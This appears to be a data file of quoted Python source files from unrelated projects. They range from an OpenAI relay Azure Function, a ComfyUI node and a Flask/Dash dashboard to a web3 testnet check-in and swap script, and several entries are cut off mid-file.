    "import logging\nimport azure.functions as func\nfrom openai import OpenAI\nimport json\nfrom util.servicebus import servicebus_client\n\napp = func.FunctionApp()\nclient = OpenAI()\n\n@app.service_bus_queue_trigger(arg_name=\"msg\", queue_name=\"process-request-queue\",\n                               connection=\"SB_CONNECTION_URL\") \nasync def process_request(msg: func.ServiceBusMessage):\n    message = json.loads(msg.get_body().decode('utf-8'))\n    completion = client.chat.completions.create(\n        model=\"gpt-4o\",\n        messages=[\n            {\"role\": \"system\", \"content\": \"\uc9c8\ubb38\uc5d0 \ub300\ud574 \ud55c\uad6d\uc5b4\ub85c \ub300\ub2f5\ud574.\"},\n            {\n                \"role\": \"user\",\n                \"content\": message[\"content\"]\n            }\n        ]\n    )\n    answer_data = {\n        \"channel_id\": message[\"channel_id\"],\n        \"content\": completion.choices[0].message.content,\n        \"type\" : \"answer\"\n    }\n    # logging.debug(completion.choices[0].message.content)\n    await servicebus_client.send_message(\"process-response-queue\", answer_data)\n    # logging.debug(\"\uba54\uc138\uc9c0 \uc804\uc1a1\")\n\n",
    "from util import upload_imgbb\n\nasync def imgbb(bot, event):\n  if event.args:\n    return await event.sendReply(\"This command don't need an arguments\")\n  if not event.reply:\n    return await event.sendReply(event.font(\":mono[Please reply to the image]\"))\n  try:\n    urls = []\n    for url in event.reply.attachments:\n      if '.mp4' in url.large_preview_url:\n        print(f\"\\033[0;31m[ERROR] \\033[0m{res['error']}\")\n        return await event.sendReply(event.font(\":mono[Invalid image attachment]\"))\n      res = upload_imgbb(url.large_preview_url)\n      if 'error' in res:\n        print(f\"\\033[0;31m[ERROR] \\033[0m{res['error']}\")\n        return await event.sendReply(event.font(\":mono[An error occurred while uploading the image.]\"))\n      else:\n        urls.append(res['image_url'])\n    if len(urls) == 0:\n      print(f\"\\033[0;31m[ERROR] \\033[0m{res['error']}\")\n      return await event.sendReply(event.font(\":mono[An error occurred while uploading the image.]\"))\n    else:\n      message = event.font(\":bold[IMGBB]\")\n      message += \"\\nImage successfully uploaded\\n\"\n      for index, link in enumerate(urls):\n        message += f\"\\n{index+1}. {link}\"\n      await event.sendReply(message)\n  except Exception as e:\n    print(\"\\033[0;31m[ERROR] \\033[0m{}\".format(e))\n    return await event.sendReply(event.font(\":mono[An error occurred while uploading the image.]\"))\n\nconfig = {\n  \"name\": 'imgbb',\n  \"def\": imgbb,\n  \"description\": 'Upload image to imgbb and get the image link',\n  \"usage\": '{p}imgbb <reply to image>',\n  \"author\": 'ako SI choru',\n  \"usePrefix\": True\n}",
    "import os\nimport torch\nfrom PIL import Image\nimport torchvision.transforms.functional as tf\nimport logging\n\nimport numpy as np\nimport scipy.ndimage\nimport comfy.utils\n\nMAX_RESOLUTION=16384\n\ndef composite(destination, source, x, y, mask = None, multiplier = 8, resize_source = False):\n    source = source.to(destination.device)\n    if resize_source:\n        source = torch.nn.functional.interpolate(source, size=(destination.shape[2], destination.shape[3]), mode=\"bilinear\")\n\n    source = comfy.utils.repeat_to_batch_size(source, destination.shape[0])\n\n    x = max(-source.shape[3] * multiplier, min(x, destination.shape[3] * multiplier))\n    y = max(-source.shape[2] * multiplier, min(y, destination.shape[2] * multiplier))\n\n    left, top = (x // multiplier, y // multiplier)\n    right, bottom = (left + source.shape[3], top + source.shape[2],)\n\n    if mask is None:\n        mask = torch.ones_like(source)\n    else:\n        mask = mask.to(destination.device, copy=True)\n        mask = torch.nn.functional.interpolate(mask.reshape((-1, 1, mask.shape[-2], mask.shape[-1])), size=(source.shape[2], source.shape[3]), mode=\"bilinear\")\n        mask = comfy.utils.repeat_to_batch_size(mask, source.shape[0])\n\n    # calculate the bounds of the source that will be overlapping the destination\n    # this prevents the source trying to overwrite latent pixels that are out of bounds\n    # of the destination\n    visible_width, visible_height = (destination.shape[3] - left + min(0, x), destination.shape[2] - top + min(0, y),)\n\n    mask = mask[:, :, :visible_height, :visible_width]\n    inverse_mask = torch.ones_like(mask) - mask\n\n    source_portion = mask * source[:, :, :visible_height, :visible_width]\n    destination_portion = inverse_mask  * destination[:, :, top:bottom, left:right]\n\n    print('source_portion:', source_portion.shape)\n    print('destination_portion:', destination_portion.shape)\n    destination[:, :, top:bottom, left:right] = source_portion + destination_portion\n    return destination\n\nclass StickerMaskComposite:\n    @classmethod\n    def INPUT_TYPES(s):\n        return {\n            \"required\": {\n                \"destination\": (\"IMAGE\",),\n                \"source\": (\"IMAGE\",),\n                \"x1\": (\"INT\", {\"default\": 94, \"min\": 0, \"max\": MAX_RESOLUTION, \"step\": 1}),\n                \"y1\": (\"INT\", {\"default\": 700, \"min\": 0, \"max\": MAX_RESOLUTION, \"step\": 1}),\n                \"x2\": (\"INT\", {\"default\": 614, \"min\": 0, \"max\": MAX_RESOLUTION, \"step\": 1}),\n                \"y2\": (\"INT\", {\"default\": 700, \"min\": 0, \"max\": MAX_RESOLUTION, \"step\": 1}),\n                \"x3\": (\"INT\", {\"default\": 1134, \"min\": 0, \"max\": MAX_RESOLUTION, \"step\": 1}),\n                \"y3\": (\"INT\", {\"default\": 700, \"min\": 0, \"max\": MAX_RESOLUTION, \"step\": 1}),\n                \"x4\": (\"INT\", {\"default\": 94, \"min\": 0, \"max\": MAX_RESOLUTION, \"step\": 1}),\n                \"y4\": (\"INT\", {\"default\": 1420, \"min\": 0, \"max\": MAX_RESOLUTION, \"step\": 1}),\n                \"x5\": (\"INT\", {\"default\": 614, \"min\": 0, \"max\": MAX_RESOLUTION, \"step\": 1}),\n                \"y5\": (\"INT\", {\"default\": 1420, \"min\": 0, \"max\": MAX_RESOLUTION, \"step\": 1}),\n                \"x6\": (\"INT\", {\"default\": 1134, \"min\": 0, \"max\": MAX_RESOLUTION, \"step\": 1}),\n                \"y6\": (\"INT\", {\"default\": 1420, \"min\": 0, \"max\": MAX_RESOLUTION, \"step\": 1}),\n                \"resize_source\": (\"BOOLEAN\", {\"default\": False}),\n            },\n            \"optional\": {\n                \"mask\": (\"MASK\",),\n            }\n        }\n    RETURN_TYPES = (\"IMAGE\",)\n    FUNCTION = \"composite\"\n\n    CATEGORY = \"image\"\n\n    def composite(self, destination, source, x1, y1, x2, y2, x3, y3, x4, y4, x5, y5, x6, y6, resize_source, mask = None):\n        # print(source.shape)\n        size_pack = [(x1, y1), (x2, y2), (x3, y3), (x4, y4), (x5, y5), (x6, y6)]\n        # print(\"dest\", destination.shape)\n        for i in range(len(size_pack)):\n            destination = destination.clone().movedim(-1, 1)\n            # print(\"source\", source[i].unsqueeze(0).movedim(-1, 1).shape)\n            destination = composite(destination, source[i].unsqueeze(0).movedim(-1, 1), size_pack[i][0], size_pack[i][1], mask[i].unsqueeze(0), 1, resize_source).movedim(1, -1)\n        return (destination,)\n\n\n\nNODE_CLASS_MAPPINGS = {\n    \"Sticker_Compositer\": StickerMaskComposite,\n}\n\nNODE_DISPLAY_NAME_MAPPINGS = {\n    \"Sticker_Compositer\": \"Sticker Compositer\",\n}\n",
    "from enum import IntEnum\n\n\nclass Status(IntEnum):\n    \"\"\"Enumeration of status codes.\"\"\"\n\n    SUCCESS = 0x00  # The request completed successfully.\n    NOT_SUPPORTED = 0x01  # The request is not supported.\n    BAD_ARGUMENTS = 0x02  # One or more arguments are not correct.\n    BAD_ADDRESS = 0x03  # The address is incorrect.\n    BAD_FUNCTION = 0x04  # Incorrect function.\n    BAD_HANDLE = 0x05  # The handle is invalid.\n    BAD_DATA = 0x06  # The data is invalid.\n    BAD_LENGTH = (\n        0x07  # The program issued a command but the command length is incorrect.\n    )\n    NO_MEMORY = 0x08  # Not enough storage is available to process this command.\n    NO_DEVICE = 0x09  # No such device\n    NO_DATA = 0x0A  # No data is available.\n    RETRY = 0x0B  # The operation could not be completed. A retry should be performed.\n    NOT_READY = 0x0C  # The device is not ready.\n    IO = 0x0D  # I/O error\n    CRC = 0x0E  # Data error (cyclic redundancy check).\n    CANCELLED = 0x0F  # The operation was cancelled.\n    RESET = 0x10  # The I/O bus was reset.\n    PENDING = 0x11  # The operation is in progress.\n    BUSY = 0x12  # Device or resource busy\n    TIMEOUT = 0x13  # This operation returned because the timeout period expired.\n    OVERFLOW = 0x14  # Value too large for defined data type\n    NOT_FOUND = 0x15  # Element not found.\n    STALLED = 0x16  # Endpoint stalled.\n    DENIED = 0x17  # Access denied or authentication failed.\n    REJECTED = 0x18  # Rejected (e.g. by user).\n    AMBIGUOUS = 0x19  # Ambiguous e.g. name or number.\n    NO_RESOURCE = 0x1A  # Not enough resources are available to process this command.\n    NOT_CONNECTED = 0x1B  # No connection to destination.\n    OFFLINE = 0x1C  # Destination is offline.\n    REMOTE_ERROR = 0x1D  # Failed at remote destination.\n    NO_CAPABILITY = 0x1E  # A required capability is missing.\n    FILE_ACCESS = 0x1F  # File access error.\n    DUPLICATE = (\n        0x20  # Duplicate entry e.g. same entry already exists when trying to create.\n    )\n    LOGGED_OUT = 0x21  # Operation not possible while logged out.\n    ABNORMAL_TERMINATION = 0x22  # Operation terminated abnormally.\n    FAILED = 0x23  # Operation failed.\n    UNKNOWN = 0x24  # Unknown error.\n    BLOCKED = 0x25  # Destination is blocked.\n    NOT_AUTHORIZED = 0x26  # You are not authorized to perform this operation.\n    PROXY_CONNECT = 0x27  # Could not connect to proxy.\n    INVALID_PASSWORD = 0x28  # Invalid password.\n    FORBIDDEN = 0x29  # Forbidden.\n    MISSING_PARAMETER = 0x2A  # One or more mandatory paramters are missing.\n    SPARE_2B = 0x2B  # Spare.\n    SPARE_2C = 0x2C  # Spare.\n    SPARE_2D = 0x2D  # Spare.\n    SPARE_2E = 0x2E  # Spare.\n    SPARE_2F = 0x2F  # Spare.\n    UNAVAILABLE = 0x30  # Service unavailable.\n    NETWORK = 0x31  # Network error.\n    NO_CREDITS = 0x32  # No credits.\n    LOW_CREDITS = 0x33  # Low credits.\n    MAX = 0xFF  # Highest possible status code.\n",
    "import os\r\nfrom dotenv import load_dotenv\r\nfrom phi.agent import Agent\r\nfrom phi.model.groq import Groq\r\nfrom phi.tools.yfinance import YFinanceTools\r\nfrom phi.tools.duckduckgo import DuckDuckGo\r\n\r\n# Load environment variables\r\ndef initialize_environment():\r\n    load_dotenv()\r\n    groq_api_key = os.getenv(\"GROQ_API_KEY\")\r\n    if not groq_api_key:\r\n        raise ValueError(\"GROQ_API_KEY is not set in the environment variables.\")\r\n    return groq_api_key\r\n\r\n# Create a Web Search Agent\r\n# Create a Web Search Agent\r\ndef create_web_search_agent(api_key):\r\n    return Agent(\r\n        name=\"Web Search Agent\",\r\n        role=\"Search the web for information\",\r\n        model=Groq(id=\"llama-3.2-11b-vision-preview\", api_key=api_key),  # Ensure Groq model is used\r\n        tools=[DuckDuckGo()],\r\n        instructions=[\"Always include sources\"],\r\n        show_tool_calls=True,\r\n        markdown=True,\r\n    )\r\n\r\n# Create a Financial Agent\r\ndef create_financial_agent(api_key):\r\n    return Agent(\r\n        name=\"Finance AI Agent\",\r\n        model=Groq(id=\"llama-3.2-11b-vision-preview\", api_key=api_key),  # Ensure Groq model is used\r\n        tools=[YFinanceTools(\r\n            stock_price=True,\r\n            analyst_recommendations=True,\r\n            stock_fundamentals=True,\r\n            company_news=True,\r\n        )],\r\n        instructions=[\"Use tables to display the data\"],\r\n        show_tool_calls=True,\r\n        markdown=True,\r\n    )\r\n\r\n# Create a Multi-Agent System\r\ndef create_multi_agent(agents):\r\n    return Agent(\r\n        team=agents,\r\n        instructions=[\r\n            \"Always include sources\",\r\n            \"Use tables to display the data\",\r\n        ],\r\n        show_tool_calls=True,\r\n        markdown=True,\r\n    )\r\n\r\n# Main function\r\ndef main():\r\n    try:\r\n        # Initialize environment variables and get the API key\r\n        groq_api_key = initialize_environment()\r\n\r\n        # Create individual agents\r\n        web_search_agent = create_web_search_agent(groq_api_key)\r\n        financial_agent = create_financial_agent(groq_api_key)\r\n\r\n        # Combine into a multi-agent system\r\n        multi_agent = create_multi_agent([web_search_agent, financial_agent])\r\n\r\n        # Perform tasks using the multi-agent system\r\n        print(\"=== Financial Agent Response ===\")\r\n        financial_agent.print_response(\r\n            \"Provide details of stock AAPL\",\r\n            stream=True,\r\n        )\r\n\r\n        print(\"\\n=== Multi-Agent Response ===\")\r\n        multi_agent.print_response(\r\n            \"Summarize analyst recommendation and share the latest news from AAPL\",\r\n            stream=True,\r\n        )\r\n    except Exception as e:\r\n        print(f\"Error: {e}\")\r\n\r\nif __name__ == \"__main__\":\r\n    main()\r\n",
    "\"\"\"2024\u20132025 Scouting TX Calc Program\"\"\"\nimport time\nfrom math import pi, sin\nimport matplotlib.pyplot as plt\nimport colorama\nimport progressbar_\n\npavgcol: int  =  0\noutput_calculated: int  =  0\n\n\n\n\n# IGNORE THESE VARIABLES\n# x = Total Block time\n# y = NO. of Blocks\n# a = opponent 1 score time\n# b = opponent 2 score time\n# s = Our sample score time\n# \u03b1 = Our specimen score time\n# \u03b8 = Teamate score time\n# c = Single block duration\n# w = win margin\n# k = NO. of buckets scored\n# r = NO. of specimen scored\n# t = match time passed\n# m = total NO. of times\n# g = block gap time\n# u = 1, -1 (m)\n\n# _s = sample\n# _p = points\n# _se = sec\n# _p = positions\n\n# uppercase = opp\n# lowercase = team\n\n# a = opp1\n# b = opp2\n\n# Set all vars to zero\n\n\n# Equations\n\ndef u(t, n, l, isblocked):\n    \"\"\"\n\n    :param t:\n    :param n:\n    :param l:\n    :param isblocked:\n    :return:\n    \"\"\"\n    global output_calculated\n    if not isblocked:\n        output_calculated = 1 * sin((pi / n) * t + l)\n    elif isblocked:\n        output_calculated = sin((pi / n) * t)\n    return output_calculated\n\n\ndef calcloop(depth, current, tree, r_t, r_n, r_l):\n    \"\"\"\n\n    :param depth:\n    :param current:\n    :param tree:\n    :param r_t:\n    :param r_n:\n    :param r_l:\n    \"\"\"\n    if current <= depth:\n        tree_true = u(r_t, r_n, r_l, True)\n        tree.append([tree_true, current, True])\n        calcloop(depth, current + 1, tree, r_t, r_n, r_l)\n        tree_false = u(r_t, r_n, r_l, False)\n        tree.append([tree_false, current, False])\n        calcloop(depth, current + 1, tree, r_t, r_n, r_l)\n    else:\n        pass\n\n\ndef iter_calcloop(depth: int, calc_n: int, calc_l: float, start: int, team: int = 0):\n    \"\"\"\n\n    :param depth:\n    :param calc_n:\n    :param calc_l:\n    :param start:\n    :param team:\n    :return:\n    \"\"\"\n    global pavgcol\n    tree = []\n    txtree = [0]\n    prv = 1\n    prv1 = 1\n    prv2 = 1\n    prv3 = 1\n    pavg = 1\n    \n    for i in range(120 - start):\n        \n        st1 = time.time_ns()\n        #print(f\"\\rGenerating Tree {i}, prev: {round(prv, 2)} ms\", end=\"\")\n        if prv1 > prv:\n            pmincol = colorama.Fore.GREEN\n        elif prv1 < prv:\n            pmincol = colorama.Fore.RED\n        else:\n            pmincol = colorama.Fore.YELLOW\n        \n        pavg = round(pavg, 2)\n        \n        if pavg > 5000:\n            pavgcol = colorama.Fore.RED\n        if 1000 < pavg < 4999:\n            pavgcol = colorama.Fore.LIGHTRED_EX\n        if 500 < pavg < 999:\n            pavgcol = colorama.Fore.YELLOW\n        if 100 < pavg < 499:\n            pavgcol = colorama.Fore.GREEN\n        if 0 < pavg < 99:\n            pavgcol = colorama.Fore.BLUE\n        progressbar_.bar(i, 120 - start, length=15, fill=\"#\",\n                         prefix=f\"{colorama.Fore.LIGHTWHITE_EX}Generating \"\n                                f\"{120 - start} Trees @ T{team}\",\n                         suffix=f\"{colorama.Fore.LIGHTWHITE_EX}| Tree{i} | \"\n                                f\"Tree Prev Gen Tx: {pmincol}{prv}\"\n                                f\"{colorama.Fore.LIGHTWHITE_EX} | Avg: {pavgcol}{pavg}\")\n        subtree = []\n        \n        calcloop(depth, 0, subtree, i, calc_n, calc_l)\n        tree.append([f\"tree{i}\", subtree])\n        txtree.append(i)\n        prv4 = prv3\n        prv3 = prv2\n        prv2 = prv1\n        prv1 = prv\n        \n        prv = time.time_ns() - st1\n        prv /= 1000000\n        prv = round(prv, 2)\n        pavg = (prv + prv1 + prv2 + prv3 + prv4) / 5\n    #print(tree)\n    print(\"\\n\")\n    #print(\"\\nCalculation Complete\")\n    return tree, txtree\n\ndef find_best(depth, t, n, l, plot, col, team):\n    \"\"\"\n    :param depth:\n    :param t:\n    :param n:\n    :param l:\n    :param plot:\n    :param col:\n    :param team:\n    \"\"\"\n    # this func is incomplete\n    plotlist = [0]\n    txtree = [0]\n    valuetree, timetree = iter_calcloop(depth, n, l, t, team)\n    for tree in valuetree:\n        avgvar = 0\n        for list_2 in tree[1][0]:\n            avgvar += list_2\n        \n        plotlist.append(tree[1][0][0])\n    #print(avgvar)\n    txtree.append(timetree)\n    plot.plot(timetree, plotlist, col)\n    \n    #print(timetree)\n\n\n#c_t = int(input(\"c: \"))6\n#c_n = int(input(\"n: \"))\n#c_l = int(input(\"l: \"))\n#dpt = int(input(\"depth: \"))\n#print(iter_calcloop(10, 6, 0.5, 0))\n#with open(\"outputs.txt\", \"w\") as _f_e_2:\n#    _f_e_2.write(str(iter_calcloop(10, 6, 0.5, 0)))\n\ndef find_teams(depth, t1_n, t1_l, t2_n, t2_l, t3_n, t3_l, t4_n, t4_l, start):\n    \"\"\"\n    :param depth:\n    :param t1_n:\n    :param t1_l:\n    :param t2_n:\n    :param t2_l:\n    :param t3_n:\n    :param t3_l:\n    :param t4_n:\n    :param t4_l:\n    :param start:\n    \"\"\"\n    find_best(depth, start, t1_n, t1_l, plt, \"g\", 1)\n    find_best(depth, start, t2_n, t2_l, plt, \"b\", 2)\n    find_best(depth, start, t3_n, t3_l, plt, \"r\", 3)\n    find_best(depth, start, t4_n, t4_l, plt, \"y\", 4)\n    \n    #plt.axes.Axes.axhline()\n    \n    plt.show()\n\n\nt1n = float(input(\"Team 1 n: \"))\nt1l = float(input(\"Team 1 l: \"))\nt2n = float(input(",
    "\nimport torch\nimport torch.nn as nn\n\n\nfrom comfy_api.ldm.modules.diffusionmodules.mmdit import (\n    TimestepEmbedder,\n    PatchEmbed,\n)\nfrom .poolers import AttentionPool\n\nimport comfy_api.latent_formats\nfrom .models import HunYuanDiTBlock, calc_rope\n\n\n\nclass HunYuanControlNet(nn.Module):\n    \"\"\"\n    HunYuanDiT: Diffusion model with a Transformer backbone.\n\n    Inherit ModelMixin and ConfigMixin to be compatible with the sampler StableDiffusionPipeline of diffusers.\n\n    Inherit PeftAdapterMixin to be compatible with the PEFT training pipeline.\n\n    Parameters\n    ----------\n    args: argparse.Namespace\n        The arguments parsed by argparse.\n    input_size: tuple\n        The size of the input image.\n    patch_size: int\n        The size of the patch.\n    in_channels: int\n        The number of input channels.\n    hidden_size: int\n        The hidden size of the transformer backbone.\n    depth: int\n        The number of transformer blocks.\n    num_heads: int\n        The number of attention heads.\n    mlp_ratio: float\n        The ratio of the hidden size of the MLP in the transformer block.\n    log_fn: callable\n        The logging function.\n    \"\"\"\n\n    def __init__(\n        self,\n        input_size: tuple = 128,\n        patch_size: int = 2,\n        in_channels: int = 4,\n        hidden_size: int = 1408,\n        depth: int = 40,\n        num_heads: int = 16,\n        mlp_ratio: float = 4.3637,\n        text_states_dim=1024,\n        text_states_dim_t5=2048,\n        text_len=77,\n        text_len_t5=256,\n        qk_norm=True,  # See http://arxiv.org/abs/2302.05442 for details.\n        size_cond=False,\n        use_style_cond=False,\n        learn_sigma=True,\n        norm=\"layer\",\n        log_fn: callable = print,\n        attn_precision=None,\n        dtype=None,\n        device=None,\n        operations=None,\n        **kwargs,\n    ):\n        super().__init__()\n        self.log_fn = log_fn\n        self.depth = depth\n        self.learn_sigma = learn_sigma\n        self.in_channels = in_channels\n        self.out_channels = in_channels * 2 if learn_sigma else in_channels\n        self.patch_size = patch_size\n        self.num_heads = num_heads\n        self.hidden_size = hidden_size\n        self.text_states_dim = text_states_dim\n        self.text_states_dim_t5 = text_states_dim_t5\n        self.text_len = text_len\n        self.text_len_t5 = text_len_t5\n        self.size_cond = size_cond\n        self.use_style_cond = use_style_cond\n        self.norm = norm\n        self.dtype = dtype\n        self.latent_format = comfy_api.latent_formats.SDXL\n\n        self.mlp_t5 = nn.Sequential(\n            nn.Linear(\n                self.text_states_dim_t5,\n                self.text_states_dim_t5 * 4,\n                bias=True,\n                dtype=dtype,\n                device=device,\n            ),\n            nn.SiLU(),\n            nn.Linear(\n                self.text_states_dim_t5 * 4,\n                self.text_states_dim,\n                bias=True,\n                dtype=dtype,\n                device=device,\n            ),\n        )\n        # learnable replace\n        self.text_embedding_padding = nn.Parameter(\n            torch.randn(\n                self.text_len + self.text_len_t5,\n                self.text_states_dim,\n                dtype=dtype,\n                device=device,\n            )\n        )\n\n        # Attention pooling\n        pooler_out_dim = 1024\n        self.pooler = AttentionPool(\n            self.text_len_t5,\n            self.text_states_dim_t5,\n            num_heads=8,\n            output_dim=pooler_out_dim,\n            dtype=dtype,\n            device=device,\n            operations=operations,\n        )\n\n        # Dimension of the extra input vectors\n        self.extra_in_dim = pooler_out_dim\n\n        if self.size_cond:\n            # Image size and crop size conditions\n            self.extra_in_dim += 6 * 256\n\n        if self.use_style_cond:\n            # Here we use a default learned embedder layer for future extension.\n            self.style_embedder = nn.Embedding(\n                1, hidden_size, dtype=dtype, device=device\n            )\n            self.extra_in_dim += hidden_size\n\n        # Text embedding for `add`\n        self.x_embedder = PatchEmbed(\n            input_size,\n            patch_size,\n            in_channels,\n            hidden_size,\n            dtype=dtype,\n            device=device,\n            operations=operations,\n        )\n        self.t_embedder = TimestepEmbedder(\n            hidden_size, dtype=dtype, device=device, operations=operations\n        )\n        self.extra_embedder = nn.Sequential(\n            operations.Linear(\n                self.extra_in_dim, hidden_size * 4, dtype=dtype, device=device\n            ),\n            nn.SiLU(),\n            operations.Linear(\n                hidden_size * 4, hidden_size, bias=True, dtype=dtype, device=device\n            ),\n        )\n\n        # HUnYuanDiT Blocks\n        self.blocks = nn.ModuleList(\n            [\n                HunYuanDiTBlock(\n           ",
    "from flask import Flask, render_template, request, redirect\nimport pandas as pd\nimport dash\nfrom dash import dcc, html\nfrom dash.dependencies import Input, Output\n\n# Flask app\napp = Flask(__name__)\n\n# Dash app\ndash_app = dash.Dash(__name__, server=app, url_base_pathname='/dashboard/')\n\n# Placeholder for uploaded data\nglobal_data = pd.DataFrame()\n\n# Flask route for homepage\n@app.route('/', methods=['GET', 'POST'])\ndef index():\n    if request.method == 'POST':\n        file = request.files['file']\n        if file:\n            global global_data\n            global_data = pd.read_csv(file)\n            return redirect('/dashboard/')\n    return render_template('index.html')\n\n# Dash layout\ndash_app.layout = html.Div([\n    html.H1(\"Interactive Data Visualization Dashboard\", style={'textAlign': 'center'}),\n    \n    html.Div([\n        html.Label(\"Select Columns for X-Axis\"),\n        dcc.Dropdown(id='x-axis-column', placeholder='Select X-Axis', multi=False),\n        \n        html.Label(\"Select Columns for Y-Axis\"),\n        dcc.Dropdown(id='y-axis-column', placeholder='Select Y-Axis', multi=True),\n        \n        html.Label(\"Select Plot Type\"),\n        dcc.RadioItems(\n            id='plot-type',\n            options=[\n                {'label': 'Line Chart', 'value': 'line'},\n                {'label': 'Scatter Plot', 'value': 'scatter'},\n                {'label': 'Pie Chart', 'value': 'pie'}\n            ],\n            value='line',\n            labelStyle={'display': 'inline-block', 'margin-right': '10px'}\n        ),\n    ], style={'padding': '10px', 'border': '1px solid #ccc', 'borderRadius': '10px', 'margin': '10px'}),\n    \n    dcc.Graph(id='data-graph'),\n])\n\n# Dash callbacks\n@dash_app.callback(\n    [Output('x-axis-column', 'options'),\n     Output('y-axis-column', 'options'),\n     Output('data-graph', 'figure')],\n    [Input('x-axis-column', 'value'),\n     Input('y-axis-column', 'value'),\n     Input('plot-type', 'value')]\n)\ndef update_graph(x_column, y_columns, plot_type):\n    global global_data\n\n    # Dropdown options\n    options = [{'label': col, 'value': col} for col in global_data.columns]\n    \n    # Initialize figure\n    figure = {'data': [], 'layout': {'title': 'No data selected'}}\n\n    # Plotting logic\n    if x_column and y_columns:\n        if plot_type == 'line':\n            figure = {\n                'data': [\n                    {'x': global_data[x_column], 'y': global_data[y], 'type': 'line', 'name': y}\n                    for y in y_columns\n                ],\n                'layout': {'title': f'Line Chart: {\", \".join(y_columns)} vs {x_column}'}\n            }\n        elif plot_type == 'scatter':\n            figure = {\n                'data': [\n                    {'x': global_data[x_column], 'y': global_data[y], 'mode': 'markers', 'name': y}\n                    for y in y_columns\n                ],\n                'layout': {'title': f'Scatter Plot: {\", \".join(y_columns)} vs {x_column}'}\n            }\n        elif plot_type == 'pie' and len(y_columns) == 1:\n            figure = {\n                'data': [{\n                    'labels': global_data[x_column],\n                    'values': global_data[y_columns[0]],\n                    'type': 'pie'\n                }],\n                'layout': {'title': f'Pie Chart: {y_columns[0]} by {x_column}'}\n            }\n    \n    return options, options, figure\n\n",
    "from web3 import Web3\r\nfrom eth_account import Account\r\nimport json\r\nimport time\r\nimport random\r\nimport os\r\nfrom dotenv import load_dotenv\r\nfrom datetime import datetime, timedelta\r\n\r\n# Load environment variables\r\nload_dotenv()\r\n\r\n# Network Configuration\r\nRPC_URL = \"https://rpc-testnet.inichain.com\"\r\nCHAIN_ID = 7234\r\n\r\n# Contract Addresses\r\nDAILY_CHECKIN_CONTRACT = \"0x73439c32e125B28139823fE9C6C079165E94C6D1\"\r\nROUTER_CONTRACT = \"0x4ccB784744969D9B63C15cF07E622DDA65A88Ee7\"\r\nWINI_CONTRACT = \"0xfbECae21C91446f9c7b87E4e5869926998f99ffe\"\r\nUSDT_CONTRACT = \"0xcF259Bca0315C6D32e877793B6a10e97e7647FdE\"\r\n\r\n# Token Decimals\r\nUSDT_DECIMALS = 18\r\nINI_DECIMALS = 18\r\n\r\n# ABI minimal yang diperlukan\r\nERC20_ABI = [\r\n    {\r\n        \"constant\": True,\r\n        \"inputs\": [{\"name\": \"_owner\", \"type\": \"address\"}],\r\n        \"name\": \"balanceOf\",\r\n        \"outputs\": [{\"name\": \"balance\", \"type\": \"uint256\"}],\r\n        \"type\": \"function\"\r\n    },\r\n    {\r\n        \"constant\": False,\r\n        \"inputs\": [\r\n            {\"name\": \"_spender\", \"type\": \"address\"},\r\n            {\"name\": \"_value\", \"type\": \"uint256\"}\r\n        ],\r\n        \"name\": \"approve\",\r\n        \"outputs\": [{\"name\": \"\", \"type\": \"bool\"}],\r\n        \"type\": \"function\"\r\n    },\r\n    {\r\n        \"constant\": True,\r\n        \"inputs\": [],\r\n        \"name\": \"decimals\",\r\n        \"outputs\": [{\"name\": \"\", \"type\": \"uint8\"}],\r\n        \"type\": \"function\"\r\n    },\r\n    {\r\n        \"constant\": True,\r\n        \"inputs\": [\r\n            {\"name\": \"_owner\", \"type\": \"address\"},\r\n            {\"name\": \"_spender\", \"type\": \"address\"}\r\n        ],\r\n        \"name\": \"allowance\",\r\n        \"outputs\": [{\"name\": \"\", \"type\": \"uint256\"}],\r\n        \"type\": \"function\"\r\n    }\r\n]\r\n\r\nROUTER_ABI = [\r\n    {\r\n        \"inputs\": [\r\n            {\"internalType\": \"uint256\", \"name\": \"amountIn\", \"type\": \"uint256\"},\r\n            {\"internalType\": \"uint256\", \"name\": \"amountOutMin\", \"type\": \"uint256\"},\r\n            {\"internalType\": \"address[]\", \"name\": \"path\", \"type\": \"address[]\"},\r\n            {\"internalType\": \"address\", \"name\": \"to\", \"type\": \"address\"},\r\n            {\"internalType\": \"uint256\", \"name\": \"deadline\", \"type\": \"uint256\"}\r\n        ],\r\n        \"name\": \"swapExactTokensForTokens\",\r\n        \"outputs\": [{\"internalType\": \"uint256[]\", \"name\": \"amounts\", \"type\": \"uint256[]\"}],\r\n        \"stateMutability\": \"nonpayable\",\r\n        \"type\": \"function\"\r\n    },\r\n    {\r\n        \"inputs\": [\r\n            {\"internalType\": \"uint256\", \"name\": \"amountOutMin\", \"type\": \"uint256\"},\r\n            {\"internalType\": \"address[]\", \"name\": \"path\", \"type\": \"address[]\"},\r\n            {\"internalType\": \"address\", \"name\": \"to\", \"type\": \"address\"},\r\n            {\"internalType\": \"uint256\", \"name\": \"deadline\", \"type\": \"uint256\"}\r\n        ],\r\n        \"name\": \"swapExactETHForTokens\",\r\n        \"outputs\": [{\"internalType\": \"uint256[]\", \"name\": \"amounts\", \"type\": \"uint256[]\"}],\r\n        \"stateMutability\": \"payable\",\r\n        \"type\": \"function\"\r\n    },\r\n    {\r\n        \"inputs\": [\r\n            {\"internalType\": \"uint256\", \"name\": \"amountIn\", \"type\": \"uint256\"},\r\n            {\"internalType\": \"uint256\", \"name\": \"amountOutMin\", \"type\": \"uint256\"},\r\n            {\"internalType\": \"address[]\", \"name\": \"path\", \"type\": \"address[]\"},\r\n            {\"internalType\": \"address\", \"name\": \"to\", \"type\": \"address\"},\r\n            {\"internalType\": \"uint256\", \"name\": \"deadline\", \"type\": \"uint256\"}\r\n        ],\r\n        \"name\": \"swapExactTokensForETH\",\r\n        \"outputs\": [{\"internalType\": \"uint256[]\", \"name\": \"amounts\", \"type\": \"uint256[]\"}],\r\n        \"stateMutability\": \"nonpayable\",\r\n        \"type\": \"function\"\r\n    },\r\n    {\r\n        \"inputs\": [\r\n            {\"internalType\": \"uint256\", \"name\": \"amountIn\", \"type\": \"uint256\"},\r\n            {\"internalType\": \"address[]\", \"name\": \"path\", \"type\": \"address[]\"}\r\n        ],\r\n        \"name\": \"getAmountsOut\",\r\n        \"outputs\": [{\"internalType\": \"uint256[]\", \"name\": \"amounts\", \"type\": \"uint256[]\"}],\r\n        \"stateMutability\": \"view\",\r\n        \"type\": \"function\"\r\n    }\r\n]\r\n\r\nDAILY_CHECKIN_ABI = [\r\n    {\r\n        \"inputs\": [{\"name\": \"user\", \"type\": \"address\"}],\r\n        \"name\": \"userCheckInStatus\",\r\n        \"outputs\": [{\"name\": \"\", \"type\": \"bool\"}],\r\n        \"stateMutability\": 